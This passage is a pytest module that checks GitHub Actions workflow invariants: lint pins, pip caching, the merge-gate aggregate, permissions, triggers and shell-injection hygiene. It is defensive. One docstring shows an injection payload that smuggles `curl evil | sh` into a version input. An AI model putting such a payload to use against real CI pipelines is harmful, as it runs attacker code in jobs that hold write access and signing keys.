"""Enforce structural invariants on the GitHub Actions workflow files.

The CI pipeline has a few non-obvious rules that, if violated, produce
subtle and high-impact breakage: lint passes locally but fails in CI, pip
downloads on every run, branch protection silently lets a new job slip
through. These tests check those rules so the contributor finds out at
commit time, not after they have pushed.

Rules checked here:

1. **Lint-tool versions are pinned in lockstep.** The `lint` job in
   ``.github/workflows/test.yml`` installs explicit ``ruff==``, ``black==``,
   and ``isort==`` versions. Those exact versions must match the
   ``rev:`` lines in ``.pre-commit-config.yaml`` so a contributor's
   ``pre-commit run`` produces the same verdict as CI.

2. **Every ``actions/setup-python`` step caches pip.** Any setup-python
   without ``cache: pip`` and ``cache-dependency-path: pyproject.toml``
   is a CI-minute leak -- pip re-downloads the dep set on every run.

3. **The ``required-checks`` aggregate ``needs:`` every other job.**
   Branch protection requires only the aggregate; a new job that is not
   listed in ``required-checks.needs:`` silently bypasses the gate.

4. **The coverage-ratchet job can push and publish checks.** Its bot commit
   needs ``contents: write`` and its propagated branch-protection verdict
   needs ``checks: write``.

5. **Every workflow is registered in a scope map** with its trigger class
   and whether it joins the merge gate, and the registered class must
   match the file's real ``on:`` block. This is what stops
   ``installers.yml`` silently regaining a tag trigger (double-building
   every release), stops a new workflow shipping with no ``permissions:``
   block, and pins that ``release.yml`` and ``promote.yml`` serialize
   against each other on the ``releases`` branch.

6. **The lint-pin scan walks every workflow, not one named step.** Rule 1
   reads a single step in a single file; this scan reads every
   ``pip install`` line in every workflow and cross-checks them against
   ``.pre-commit-config.yaml`` and against each other. ``test.yml``
   already had a second install site that Rule 1 could not see.

The first run of these tests caught real bugs: lint-tool version drift
between workflow and pre-commit (would only surface as CI failure with
no local repro), and a freshly-added job that the aggregate did not
``needs:`` (a merge would pass even if the new job failed).
"""

from __future__ import annotations

import re
from collections.abc import Callable, Iterator
from pathlib import Path

import pytest

# WS-M4: mark this module as fast-suite; pytest -m fast skips the 505
# warm-worker V1.34 parity fixtures and runs in <60s.
pytestmark = pytest.mark.fast

PROJECT_ROOT = Path(__file__).resolve().parents[2]
WORKFLOWS_DIR = PROJECT_ROOT / ".github" / "workflows"
TEST_WORKFLOW = WORKFLOWS_DIR / "test.yml"
PRECOMMIT_CONFIG = PROJECT_ROOT / ".pre-commit-config.yaml"


# Map a pre-commit `repo:` URL to the pip distribution name that the CI
# lint job installs. The mapping is needed because pre-commit hooks
# reference upstream repos by URL but pip installs by package name. When
# adding a new lint hook to the workflow, add the matching upstream-URL
# entry here.
_LINT_REPO_TO_PIP_NAME: dict[str, str] = {
    "https://github.com/psf/black": "black",
    "https://github.com/pycqa/isort": "isort",
    "https://github.com/astral-sh/ruff-pre-commit": "ruff",
}


def _read_workflow_text(path: Path) -> str:
    """Return the workflow file's text with a clear error if missing."""

    if not path.exists():
        pytest.fail(f"Missing workflow file: {path.relative_to(PROJECT_ROOT)}")
    return path.read_text(encoding="utf-8")


# ---------------------------------------------------------------------------
# Rule 1: lint-tool version lockstep between CI workflow and pre-commit.
# ---------------------------------------------------------------------------


def _extract_workflow_lint_pins() -> dict[str, str]:
    """Parse the `pip install "ruff==X" "black==Y" "isort==Z"` step.

    Returns ``{"ruff": "0.15.13", "black": "26.3.1", "isort": "8.0.1"}``
    (or whatever versions are currently pinned). The step text is matched
    with a regex rather than YAML-parsed because the version strings live
    inside a shell command string, not as structured workflow fields.
    """

    text = _read_workflow_text(TEST_WORKFLOW)
    # Find the `Install lint tools` step's `run:` line.
    match = re.search(
        r"name:\s*Install lint tools\s*\n\s*run:\s*(.+)\n",
        text,
    )
    if match is None:
        pytest.fail(
            "Could not find the 'Install lint tools' step in "
            ".github/workflows/test.yml. If the step was renamed, update "
            "this test's regex."
        )
    install_line = match.group(1)
    pins = dict(re.findall(r'"?([a-z][a-z0-9-]*)==([0-9][^"\s]+)"?', install_line))
    if not pins:
        pytest.fail(
            f"Could not parse any ==-pinned packages from the install line: " f"{install_line!r}"
        )
    return pins


def _extract_precommit_pins() -> dict[str, str]:
    """Parse `.pre-commit-config.yaml` for `rev:` lines under each repo.

    Returns ``{"ruff": "0.15.13", "black": "26.3.1", "isort": "8.0.1"}``.
    The leading ``v`` prefix on ruff's rev (e.g. ``v0.15.13``) is stripped
    so the comparison is apples-to-apples with the workflow's
    ``ruff==0.15.13`` form.
    """

    text = _read_workflow_text(PRECOMMIT_CONFIG)
    pins: dict[str, str] = {}
    # Walk repo: ... rev: ... blocks. The two lines are not always
    # adjacent, so capture them within a single block by anchoring at
    # `- repo:` and grabbing the next `rev:` before the next `- repo:`.
    block_pattern = re.compile(
        r"-\s*repo:\s*(\S+)\s*\n(?:.*?\n)*?\s*rev:\s*(\S+)",
        re.MULTILINE,
    )
    for repo_url, rev in block_pattern.findall(text):
        pip_name = _LINT_REPO_TO_PIP_NAME.get(repo_url)
        if pip_name is None:
            # Hook for a project we are not asserting on (e.g.
            # pre-commit-hooks). Skip.
            continue
        # Strip a leading "v" from semantic-version-style revs (ruff uses
        # "v0.15.13"; black uses "26.3.1" without v). Both must compare
        # against the workflow's ==X form.
        pins[pip_name] = rev.lstrip("v")
    return pins


def test_lint_tool_versions_match_between_workflow_and_precommit() -> None:
    """The CI lint job and pre-commit must pin identical tool versions.

    When they drift, ``pre-commit run --all-files`` passes locally but
    the CI ``lint`` job fails (or vice versa) -- a frustrating
    no-local-repro bug. Bumping a tool means updating BOTH files.
    """

    workflow = _extract_workflow_lint_pins()
    precommit = _extract_precommit_pins()

    # Both should mention the same set of pinned tools.
    common = set(workflow) & set(precommit)
    assert common, (
        "No common lint tools found between workflow and pre-commit. "
        "Either the workflow's install line was renamed or the "
        "pre-commit config no longer references black/isort/ruff."
    )

    mismatches = []
    for tool in sorted(common):
        if workflow[tool] != precommit[tool]:
            mismatches.append(
                f"  {tool}: workflow pins {workflow[tool]!r}, "
                f"pre-commit pins {precommit[tool]!r}"
            )

    assert not mismatches, (
        "Lint-tool version drift between .github/workflows/test.yml and "
        ".pre-commit-config.yaml. CI and local pre-commit must agree, "
        "otherwise contributors get conflicting verdicts. Sync both files "
        "and re-run.\n" + "\n".join(mismatches)
    )


# ---------------------------------------------------------------------------
# Rule 2: every actions/setup-python step caches pip.
# ---------------------------------------------------------------------------


def _iter_setup_python_blocks(workflow_text: str) -> list[str]:
    """Return each `uses: actions/setup-python@vN` block as one text chunk.

    The block runs from ``- name: ... uses: actions/setup-python@...``
    through the indented ``with:`` mapping that follows. We collect the
    text by line-scanning rather than YAML-parsing so we can preserve the
    exact text for the assertion's error message.
    """

    blocks: list[str] = []
    lines = workflow_text.splitlines()
    i = 0
    while i < len(lines):
        line = lines[i]
        if "uses: actions/setup-python@" in line:
            # Capture this line plus the indented ``with:`` block (if any)
            # that follows. Stop at the next step (a line that introduces a
            # new ``- name:`` or returns to or above the step indent).
            step_lines = [line]
            step_indent = len(line) - len(line.lstrip())
            j = i + 1
            while j < len(lines):
                nxt = lines[j]
                if not nxt.strip():
                    # blank line ends the step's text in YAML-as-text terms.
                    step_lines.append(nxt)
                    j += 1
                    continue
                nxt_indent = len(nxt) - len(nxt.lstrip())
                if nxt_indent <= step_indent and nxt.lstrip().startswith("- "):
                    break
                step_lines.append(nxt)
                j += 1
            blocks.append("\n".join(step_lines))
            i = j
        else:
            i += 1
    return blocks


def test_every_setup_python_step_uses_pip_caching() -> None:
    """Every ``actions/setup-python@v6`` step must cache pip.

    Without ``cache: 'pip'`` + ``cache-dependency-path: pyproject.toml``
    the job re-downloads the full dependency set on every run --
    typically 30-60 seconds of CI-minute waste per job. A new job
    added without caching is a slow leak; this test makes it loud.
    """

    violations: list[str] = []
    for workflow_path in WORKFLOWS_DIR.glob("*.yml"):
        text = _read_workflow_text(workflow_path)
        rel = workflow_path.relative_to(PROJECT_ROOT)
        for block in _iter_setup_python_blocks(text):
            if "cache:" not in block or "pip" not in block:
                violations.append(f"{rel}: setup-python step is missing `cache: pip`:\n" f"{block}")
                continue
            if "cache-dependency-path" not in block:
                violations.append(
                    f"{rel}: setup-python step caches pip but is missing "
                    f"`cache-dependency-path: pyproject.toml`. Without "
                    f"the path, the cache key is brittle:\n{block}"
                )

    assert not violations, (
        "Every actions/setup-python step must use pip caching keyed off "
        "pyproject.toml. Add the two lines under `with:`:\n"
        '          cache: "pip"\n'
        "          cache-dependency-path: pyproject.toml\n\n"
        "Violations:\n" + "\n\n".join(violations)
    )


# ---------------------------------------------------------------------------
# Rule 3: required-checks aggregate covers every upstream job.
# ---------------------------------------------------------------------------


def _parse_test_workflow_jobs() -> tuple[list[str], list[str]]:
    """Return ``(all_job_names, required_checks_needs)`` from test.yml.

    Both lists are derived from the YAML structure. The aggregate job is
    the one named exactly ``required-checks``; ``needs:`` may be a YAML
    list (`needs: [a, b]`) or a single string (`needs: foo`) -- we
    normalize to a list of strings.
    """

    # We use PyYAML if available so the test does not depend on a custom
    # parser. PyYAML is already a transitive dependency of several tools
    # (pre-commit, briefcase, etc.) so it is installed in CI.
    try:
        import yaml  # type: ignore[import-untyped]
    except ImportError:  # pragma: no cover - install yaml
        pytest.skip("PyYAML not installed; skipping workflow structure check.")

    data = yaml.safe_load(_read_workflow_text(TEST_WORKFLOW))
    jobs = data.get("jobs", {}) or {}
    all_names = sorted(jobs.keys())

    aggregate = jobs.get("required-checks")
    if aggregate is None:
        pytest.fail(
            ".github/workflows/test.yml has no `required-checks` job. "
            "Branch protection requires this aggregate; see "
            "docs/BRANCH_PROTECTION.md."
        )

    raw_needs = aggregate.get("needs")
    if raw_needs is None:
        needs: list[str] = []
    elif isinstance(raw_needs, list):
        needs = [str(n) for n in raw_needs]
    else:
        needs = [str(raw_needs)]

    return all_names, sorted(needs)


def test_required_checks_aggregate_covers_every_upstream_job() -> None:
    """``required-checks.needs:`` must list every other job in test.yml.

    Branch protection (see scripts/apply-branch-protection.sh) requires
    only the ``required-checks`` aggregate. If a new job is added but
    not appended to the aggregate's ``needs:`` list, the job can fail
    and the PR still merges -- a silent gap in the gate. This test
    fails if the two job sets drift apart.
    """

    all_names, needs = _parse_test_workflow_jobs()

    # The aggregate cannot need itself.
    expected_needs = sorted(name for name in all_names if name != "required-checks")
    missing = sorted(set(expected_needs) - set(needs))
    stale = sorted(set(needs) - set(expected_needs))

    error_parts: list[str] = []
    if missing:
        error_parts.append(
            "The following jobs exist but are NOT in required-checks.needs "
            "(branch protection cannot see their failures):\n  - " + "\n  - ".join(missing)
        )
    if stale:
        error_parts.append(
            "The following names are in required-checks.needs but the "
            "corresponding job no longer exists (rename or removal):\n  - " + "\n  - ".join(stale)
        )
    assert not error_parts, (
        "required-checks aggregate is out of sync with the workflow's "
        "job list. Update the `needs:` line in .github/workflows/test.yml "
        "so branch protection sees every gate.\n\n" + "\n\n".join(error_parts)
    )


# ---------------------------------------------------------------------------
# Rule 4: the coverage ratchet can push and propagate required-checks.
# ---------------------------------------------------------------------------


def test_coverage_ratchet_job_has_required_write_permissions() -> None:
    """The test job must be able to push and annotate its ratchet commit."""

    try:
        import yaml  # type: ignore[import-untyped]
    except ImportError:  # pragma: no cover - install yaml
        pytest.skip("PyYAML not installed; skipping workflow permission check.")

    data = yaml.safe_load(_read_workflow_text(TEST_WORKFLOW))
    test_job = (data.get("jobs", {}) or {}).get("test", {}) or {}
    permissions = test_job.get("permissions", {}) or {}

    assert (
        permissions.get("contents") == "write"
    ), "The coverage-ratchet bot commit requires `test.permissions.contents: write`."
    assert permissions.get("checks") == "write", (
        "Propagating required-checks to the coverage-ratchet bot commit requires "
        "`test.permissions.checks: write`."
    )


# ---------------------------------------------------------------------------
# Rule 5: the workflow scope map.
# ---------------------------------------------------------------------------
#
# Every workflow file is registered here with the trigger class that
# explains why it is (or is not) part of the merge gate. The map is the
# thing a reviewer reads to answer "what fires this, and does branch
# protection see it?" without opening seven YAML files.
#
# It also closes a real gap the auto-update release train opened. Before
# it, only `test.yml` was structurally asserted; `installers.yml` could
# silently regain a tag trigger (double-building every release) and a new
# workflow could ship with no `permissions:` block (inheriting the
# repository default, which may be write-all) and nothing would notice.


class _TriggerClass:
    """Trigger classes a workflow may be registered under."""

    #: Fires on `push:` to code branches; the merge gate lives here.
    BRANCH_PUSH_GATED = "branch-push-gated"
    #: Fires on `push:` to one specific non-code branch.
    BRANCH_PUSH_SCOPED = "branch-push-scoped"
    #: Fires only on a version tag push.
    TAG = "tag"
    #: Fires only on manual dispatch (possibly plus `workflow_call`).
    DISPATCH = "dispatch"
    #: Fires only on pull-request events (repo automation, not a build).
    PULL_REQUEST = "pull-request"
    #: Fires on a cron schedule (possibly alongside other triggers).
    SCHEDULE = "schedule"


#: workflow filename -> (trigger class, joins the required-checks gate?)
#
# `joins_required_checks` is False for everything except test.yml: branch
# protection requires only test.yml's `required-checks` aggregate, so any
# other workflow's failure is advisory by construction. Registering that
# explicitly stops a future reader from assuming that, say, a red
# `installers` run blocks a merge.
_WORKFLOW_SCOPE_MAP: dict[str, tuple[str, bool]] = {
    "codeql.yml": (_TriggerClass.BRANCH_PUSH_GATED, False),
    "fleet-snapshot.yml": (_TriggerClass.SCHEDULE, False),
    "installers.yml": (_TriggerClass.DISPATCH, False),
    "manifest-validate.yml": (_TriggerClass.BRANCH_PUSH_SCOPED, False),
    "promote.yml": (_TriggerClass.DISPATCH, False),
    "re-request-review.yml": (_TriggerClass.PULL_REQUEST, False),
    "release.yml": (_TriggerClass.TAG, False),
    "test.yml": (_TriggerClass.BRANCH_PUSH_GATED, True),
}


def _load_workflow(name: str) -> dict[str, object]:
    """Return the parsed YAML for one workflow file, by filename."""

    yaml = pytest.importorskip("yaml", reason="PyYAML not installed.")
    return yaml.safe_load(_read_workflow_text(WORKFLOWS_DIR / name))


def _triggers(workflow: dict[str, object]) -> dict[str, object]:
    """Return a workflow's ``on:`` mapping.

    PyYAML implements YAML 1.1, which resolves the bare key ``on`` to the
    boolean ``True``. Depending on whether the file quotes the key, the
    mapping arrives under ``"on"`` or under ``True``; both are checked.
    """

    raw = workflow.get("on", workflow.get(True))
    return raw if isinstance(raw, dict) else {}


def test_scope_map_covers_every_workflow_file() -> None:
    """Every workflow on disk is in the scope map, and vice versa.

    A new workflow nobody registered is exactly the case the other
    assertions in this module cannot see: they iterate the map, so an
    unregistered file would be silently exempt from all of them.
    """

    on_disk = {path.name for path in WORKFLOWS_DIR.glob("*.yml")}
    registered = set(_WORKFLOW_SCOPE_MAP)

    unregistered = sorted(on_disk - registered)
    missing = sorted(registered - on_disk)

    assert not unregistered, (
        "These workflow files exist but are not in _WORKFLOW_SCOPE_MAP, so "
        "the structural assertions in this module skip them entirely. Add "
        "each one with its trigger class and whether it joins "
        "required-checks:\n  - " + "\n  - ".join(unregistered)
    )
    assert not missing, (
        "These names are in _WORKFLOW_SCOPE_MAP but no such workflow file "
        "exists (renamed or deleted). Update the map:\n  - " + "\n  - ".join(missing)
    )


def test_every_workflow_yaml_parses() -> None:
    """Every workflow file must ``yaml.safe_load`` into a mapping.

    A workflow with a YAML syntax error does not fail loudly -- GitHub
    simply never runs it. For ``manifest-validate.yml``, silently not
    running means an unvalidated manifest reaches the fleet.
    """

    yaml = pytest.importorskip("yaml", reason="PyYAML not installed.")

    failures: list[str] = []
    for path in sorted(WORKFLOWS_DIR.glob("*.yml")):
        try:
            document = yaml.safe_load(path.read_text(encoding="utf-8"))
        except yaml.YAMLError as error:
            failures.append(f"{path.name}: {error}")
            continue
        if not isinstance(document, dict):
            failures.append(f"{path.name}: top level is not a mapping")

    assert not failures, "Workflow files that do not parse as YAML mappings:\n  - " + "\n  - ".join(
        failures
    )


#: Workflows that predate this rule and do not yet declare an explicit
#: `permissions:` block. This is a DRAINABLE allowlist -- its long-term
#: state is empty, and the direction is one-way: entries come off, never
#: on. Adding one requires explicit reviewer sign-off in the PR body.
#:
#: `test.yml` is here because it declares `permissions:` on exactly one
#: job (`test`, for the coverage-ratchet bot commit) and inherits the
#: repository default on the other ten. Pinning each of those to
#: least-privilege is a real change to the merge gate's token scope and
#: belongs in its own reviewed PR, not smuggled in behind an auto-update
#: pipeline change.
_WORKFLOWS_WITHOUT_EXPLICIT_PERMISSIONS: frozenset[str] = frozenset({"test.yml"})


def test_every_workflow_declares_explicit_permissions() -> None:
    """Each workflow pins ``permissions:`` at the top level or per job.

    Without an explicit block a workflow inherits the repository default,
    which on many repos is still the legacy write-all token. Declaring
    the least privilege each workflow actually needs is what makes
    ``manifest-validate.yml`` structurally unable to push.
    """

    violations: list[str] = []
    for name in sorted(set(_WORKFLOW_SCOPE_MAP) - _WORKFLOWS_WITHOUT_EXPLICIT_PERMISSIONS):
        workflow = _load_workflow(name)
        if isinstance(workflow.get("permissions"), dict):
            continue
        jobs = workflow.get("jobs")
        jobs_map = jobs if isinstance(jobs, dict) else {}
        unscoped = sorted(
            job_name
            for job_name, body in jobs_map.items()
            # A `uses:` job (reusable-workflow call) inherits the caller's
            # permissions and cannot declare its own.
            if isinstance(body, dict)
            and "uses" not in body
            and not isinstance(body.get("permissions"), dict)
        )
        if not jobs_map or unscoped:
            violations.append(
                f"{name}: no top-level `permissions:` block, and these jobs "
                f"declare none either: {unscoped or ['<no jobs parsed>']}"
            )

    assert not violations, (
        "Every workflow must declare least-privilege `permissions:` -- at "
        "the top level, or on every job that is not a reusable-workflow "
        "call. Otherwise the workflow inherits the repository default "
        "token scope.\n  - " + "\n  - ".join(violations)
    )


def test_permissions_allowlist_only_ever_shrinks() -> None:
    """The explicit-permissions allowlist is drainable, not a dumping ground.

    Without this ratchet the allowlist is a loophole: a contributor whose
    new workflow trips the rule above could "fix" it by adding a name
    here. Capping the size makes that edit fail too, so the only way past
    the rule is to actually declare the permissions.
    """

    max_size = 1
    assert len(_WORKFLOWS_WITHOUT_EXPLICIT_PERMISSIONS) <= max_size, (
        "_WORKFLOWS_WITHOUT_EXPLICIT_PERMISSIONS grew. It is drainable: "
        "entries come off as workflows gain explicit least-privilege "
        "`permissions:` blocks, and the cap drops with them. A new "
        "workflow must declare its permissions rather than join this "
        f"list. Current: {sorted(_WORKFLOWS_WITHOUT_EXPLICIT_PERMISSIONS)}"
    )
    stale = sorted(_WORKFLOWS_WITHOUT_EXPLICIT_PERMISSIONS - set(_WORKFLOW_SCOPE_MAP))
    assert not stale, (
        "These allowlist entries name workflows that no longer exist; " f"remove them: {stale}"
    )


def test_installers_workflow_has_no_tag_trigger() -> None:
    """``installers.yml`` must not fire on its own for a version tag.

    ``release.yml`` owns the ``v*`` tag and calls ``installers.yml`` via
    ``uses:``. If ``installers.yml`` kept a ``push: tags:`` trigger, every
    release would build the installers TWICE -- once inside the release
    train and once standalone -- doubling the CI bill and producing two
    artifact sets for one tag with no way to tell which one the release
    actually published.
    """

    triggers = _triggers(_load_workflow("installers.yml"))

    push = triggers.get("push")
    assert push is None, (
        "installers.yml declares a `push:` trigger. It must not: "
        "release.yml owns the `v*` tag and invokes this workflow through "
        "`uses: ./.github/workflows/installers.yml`. A push trigger here "
        f"double-builds every release. Found: {push!r}"
    )
    assert "workflow_call" in triggers, (
        "installers.yml must expose a `workflow_call:` trigger so "
        "release.yml can invoke it as the shared build."
    )
    assert "workflow_dispatch" in triggers, (
        "installers.yml must keep `workflow_dispatch:` as the standing "
        "no-tag rehearsal from the Actions tab."
    )


def test_release_and_promote_share_a_concurrency_group() -> None:
    """``release.yml`` and ``promote.yml`` must serialize against each other.

    Both write channel manifests on the ``releases`` branch. Interleaved,
    the later push silently clobbers the earlier one -- which for a
    promote racing a release means the fleet's ``stable.json`` can end up
    pointing at a version the operator never approved. A shared
    concurrency group makes them queue instead.
    """

    groups: dict[str, object] = {}
    for name in ("release.yml", "promote.yml"):
        concurrency = _load_workflow(name).get("concurrency")
        assert isinstance(concurrency, dict), (
            f"{name} must declare a `concurrency:` mapping so it cannot "
            f"race the other manifest writer. Found: {concurrency!r}"
        )
        groups[name] = concurrency.get("group")
        assert concurrency.get("cancel-in-progress") is False, (
            f"{name} must set `cancel-in-progress: false`. Cancelling a "
            f"release mid-flight can leave a GitHub Release created but "
            f"its manifest uncommitted -- the one state where the fleet's "
            f"view disagrees with the Releases page."
        )

    assert groups["release.yml"] == groups["promote.yml"], (
        "release.yml and promote.yml must share one concurrency group so a "
        "promote can never race a release onto the `releases` branch. "
        f"Found: {groups}"
    )


def test_test_workflow_push_trigger_ignores_the_releases_branch() -> None:
    """``test.yml`` must not run its full matrix on manifest commits.

    The ``releases`` branch carries only channel manifests and the fleet
    dashboard. With an unfiltered ``push:`` trigger, every one-line
    rollout-percent bump would launch the whole 3-OS suite against code
    that did not change. ``manifest-validate.yml`` is that branch's gate.
    """

    push = _triggers(_load_workflow("test.yml")).get("push")

    assert isinstance(push, dict), (
        "test.yml's `push:` trigger must be a mapping carrying "
        f"`branches-ignore`. Found: {push!r}"
    )
    ignored = push.get("branches-ignore")
    assert isinstance(ignored, list) and "releases" in ignored, (
        "test.yml's `push:` trigger must list `releases` under "
        f"`branches-ignore`. Found branches-ignore: {ignored!r}"
    )


def test_manifest_validate_watches_only_the_releases_branch() -> None:
    """``manifest-validate.yml`` is the ``releases`` branch's dedicated gate."""

    workflow = _load_workflow("manifest-validate.yml")
    push = _triggers(workflow).get("push")

    assert isinstance(push, dict), (
        f"manifest-validate.yml must trigger on `push:` with a branch " f"filter. Found: {push!r}"
    )
    assert push.get("branches") == ["releases"], (
        "manifest-validate.yml must watch exactly the `releases` branch. "
        f"Found: {push.get('branches')!r}"
    )
    assert workflow.get("permissions") == {"contents": "read"}, (
        "manifest-validate.yml must be read-only: its job is to refuse a "
        f"bad manifest, never to rewrite one. Found: {workflow.get('permissions')!r}"
    )


def _push_filter(on: dict[str, object]) -> dict[str, object]:
    """Return the ``push:`` trigger's filter mapping (empty when unfiltered).

    ``push:`` with no body parses as ``None``; ``push: {branches: [...]}``
    parses as a mapping. Both mean "this fires on a push", so callers must
    distinguish "no push key" from "push key with an empty body".
    """

    raw = on.get("push")
    return raw if isinstance(raw, dict) else {}


def _is_branch_push_gated(on: dict[str, object]) -> bool:
    """Fires on push to code branches, not restricted to a branch allowlist."""

    return "push" in on and "tags" not in _push_filter(on) and "branches" not in _push_filter(on)


def _is_branch_push_scoped(on: dict[str, object]) -> bool:
    """Fires on push to one explicit branch list, and never on a tag."""

    push = _push_filter(on)
    return "push" in on and "branches" in push and "tags" not in push


def _is_tag_driven(on: dict[str, object]) -> bool:
    """Fires on a version-tag push."""

    return "tags" in _push_filter(on)


def _is_dispatch_only(on: dict[str, object]) -> bool:
    """Fires only when invoked -- manually, or as a reusable workflow."""

    return (
        "push" not in on
        and "schedule" not in on
        and ("workflow_dispatch" in on or "workflow_call" in on)
    )


#: trigger class -> the predicate a workflow's parsed ``on:`` mapping must
#: satisfy to be registered under it. Without this, the class column of the
#: scope map is decoration: a workflow could be registered DISPATCH, grow a
#: tag trigger, and every other assertion here would still pass.
_TRIGGER_CLASS_PREDICATES: dict[str, Callable[[dict[str, object]], bool]] = {
    _TriggerClass.BRANCH_PUSH_GATED: _is_branch_push_gated,
    _TriggerClass.BRANCH_PUSH_SCOPED: _is_branch_push_scoped,
    _TriggerClass.TAG: _is_tag_driven,
    _TriggerClass.DISPATCH: _is_dispatch_only,
    _TriggerClass.PULL_REQUEST: lambda on: "pull_request" in on
    and "push" not in on
    and "schedule" not in on,
    _TriggerClass.SCHEDULE: lambda on: "schedule" in on,
}


def test_every_workflow_matches_its_registered_trigger_class() -> None:
    """The scope map's trigger class must describe the file's real ``on:``.

    This is what turns the map from a comment into an assertion. The
    concrete regression it catches is ``installers.yml`` regaining a
    ``push: tags:`` trigger: it is registered DISPATCH, and DISPATCH
    forbids any ``push:``, so the double-build comes back as a red test
    rather than as a doubled CI bill nobody reads.
    """

    violations: list[str] = []
    for name, (trigger_class, _) in sorted(_WORKFLOW_SCOPE_MAP.items()):
        on = _triggers(_load_workflow(name))
        predicate = _TRIGGER_CLASS_PREDICATES[trigger_class]
        if not predicate(on):
            violations.append(f"{name}: registered as {trigger_class!r} but `on:` is {sorted(on)}")

    assert not violations, (
        "A workflow's triggers no longer match its registered trigger class "
        "in _WORKFLOW_SCOPE_MAP. Either the trigger change is wrong, or the "
        "map needs updating to match a deliberate change:\n  - " + "\n  - ".join(violations)
    )


# ---------------------------------------------------------------------------
# Rule 7: untrusted-shaped context values never reach a `run:` body through
# `${{ }}` interpolation.
# ---------------------------------------------------------------------------
#
# `${{ }}` substitutes into the script TEXT before the shell parses it, so
# an attacker-influenceable value (a ref name, a free-text
# `workflow_dispatch` input, a PR title) becomes executable code rather
# than an argument. The fix is always the same: pass it through `env:` and
# reference `"$VAR"`, which is only ever data.
#
# This bites hardest exactly where this repo's release train lives:
# `release.yml` reads a tag name and `promote.yml` reads two operator-typed
# strings, and both then run `git` and `python` with them.

#: Context expressions considered attacker-influenceable inside a `run:`.
#: `github.event_name`, `job.status` and the like are enum-shaped and safe,
#: but they are cheap to route through `env:` too, so the rule stays simple
#: rather than maintaining an ever-growing safe list.
_UNSAFE_RUN_CONTEXTS: tuple[str, ...] = (
    "inputs.",
    "github.event.",
    "github.ref_name",
    "github.head_ref",
)


def _iter_run_blocks(workflow_text: str) -> Iterator[tuple[int, str]]:
    """Yield ``(line_number, line)`` for every line inside a ``run:`` body.

    Scanned as text rather than via the parsed YAML because the assertion
    needs a line number to name the offending site, and PyYAML discards
    positions for scalar block values.
    """

    lines = workflow_text.splitlines()
    inside = False
    run_indent = 0
    for lineno, line in enumerate(lines, start=1):
        stripped = line.strip()
        if re.match(r"^run:\s*[|>]", stripped):
            inside = True
            run_indent = len(line) - len(line.lstrip())
            continue
        if not inside:
            continue
        if stripped and (len(line) - len(line.lstrip())) <= run_indent:
            inside = False
            continue
        if stripped:
            yield lineno, line


#: Pre-existing interpolation sites, as ``filename:context``. DRAINABLE:
#: the long-term state is empty and the direction is one-way. Each entry
#: predates this rule and lives in a file the auto-update work does not
#: own, so fixing it belongs in its own reviewed change rather than being
#: smuggled in behind a pipeline PR.
#:
#: Neither is currently reachable by an outside attacker — this repo takes
#: no `pull_request_target` and no fork-writable trigger, so both values
#: come from a maintainer-controlled branch or PR — which is why they are
#: a cleanup rather than an incident. Line numbers are deliberately NOT
#: part of the key: an entry must not silently expire when a file is
#: reformatted.
_GRANDFATHERED_RUN_INTERPOLATIONS: frozenset[str] = frozenset(
    {
        # Interpolates the PR number into a `gh` invocation.
        "re-request-review.yml:github.event.pull_request.number",
        # Interpolates the branch name into the coverage-ratchet push.
        "test.yml:github.head_ref || github.ref_name",
    }
)


def test_grandfathered_interpolation_allowlist_only_ever_shrinks() -> None:
    """The injection allowlist is drainable, not an escape hatch.

    Without the cap, the rule below is advisory: anyone who trips it could
    "fix" it by adding a line here. Capping the size makes that edit fail
    too, so the only way past the rule is to actually bind the value
    through ``env:``.
    """

    max_size = 2
    assert len(_GRANDFATHERED_RUN_INTERPOLATIONS) <= max_size, (
        "_GRANDFATHERED_RUN_INTERPOLATIONS grew. It is drainable: entries "
        "come off as each site moves its value into `env:`, and the cap "
        "drops with them. New workflow code must bind untrusted context "
        f"through `env:`. Current: {sorted(_GRANDFATHERED_RUN_INTERPOLATIONS)}"
    )


def test_no_untrusted_context_is_interpolated_into_a_run_body() -> None:
    """No ``run:`` script splices an attacker-influenceable value inline.

    ``${{ inputs.version }}`` inside a ``run:`` block is a script-injection
    hole: Actions substitutes the raw text into the script before bash sees
    it, so an operator (or anyone who can reach a dispatch or a ref name)
    supplying ``1.0.0"; curl evil | sh; "`` gets arbitrary execution in a
    job that holds ``contents: write`` and, for the release train, the
    updater signing key.

    Pass the value through ``env:`` and reference ``"$VAR"`` instead.
    """

    violations: list[str] = []
    seen_grandfathered: set[str] = set()
    for path in sorted(WORKFLOWS_DIR.glob("*.yml")):
        for lineno, line in _iter_run_blocks(path.read_text(encoding="utf-8")):
            for expression in re.findall(r"\$\{\{([^}]*)\}\}", line):
                context = expression.strip()
                if not any(context.startswith(prefix) for prefix in _UNSAFE_RUN_CONTEXTS):
                    continue
                key = f"{path.name}:{context}"
                if key in _GRANDFATHERED_RUN_INTERPOLATIONS:
                    seen_grandfathered.add(key)
                    continue
                violations.append(f"  {path.name}:{lineno}: ${{{{ {context} }}}}")

    assert not violations, (
        "A `run:` body interpolates an attacker-influenceable context value "
        "directly into the script text, which is a shell-injection hole. "
        'Bind it under the step\'s `env:` and reference "$VAR" in the '
        "script instead:\n" + "\n".join(violations)
    )

    stale = sorted(_GRANDFATHERED_RUN_INTERPOLATIONS - seen_grandfathered)
    assert not stale, (
        "These allowlist entries no longer match anything on disk -- the "
        "sites were fixed. Remove them so the cap can drop with them:\n  - " + "\n  - ".join(stale)
    )


# ---------------------------------------------------------------------------
# Rule 6: the lint-pin scan walks EVERY workflow, not just test.yml's first
# install step.
# ---------------------------------------------------------------------------
#
# The #224 failure mode: a workflow step installed lint tools OUTSIDE the
# pin scan's field of view, drifted from `.pre-commit-config.yaml`, and CI
# disagreed with local pre-commit with no local repro. Rule 1 above reads
# exactly one named step in exactly one file, so `test.yml`'s SECOND
# install site was already invisible to it before the auto-update
# workflows added any of their own.


def _iter_all_lint_pin_sites() -> list[tuple[str, dict[str, str]]]:
    """Return ``(location, pins)`` for every ==-pinned lint install line.

    Walks every workflow file and every ``pip install`` line within it,
    rather than one named step in one file. ``location`` is a
    ``file:line`` label so a mismatch names the exact site to fix.
    """

    sites: list[tuple[str, dict[str, str]]] = []
    for path in sorted(WORKFLOWS_DIR.glob("*.yml")):
        for lineno, line in enumerate(path.read_text(encoding="utf-8").splitlines(), start=1):
            if "pip install" not in line:
                continue
            pins = {
                name: version
                for name, version in re.findall(r'"?([a-z][a-z0-9-]*)==([0-9][^"\s]+)"?', line)
                if name in _LINT_REPO_TO_PIP_NAME.values()
            }
            if pins:
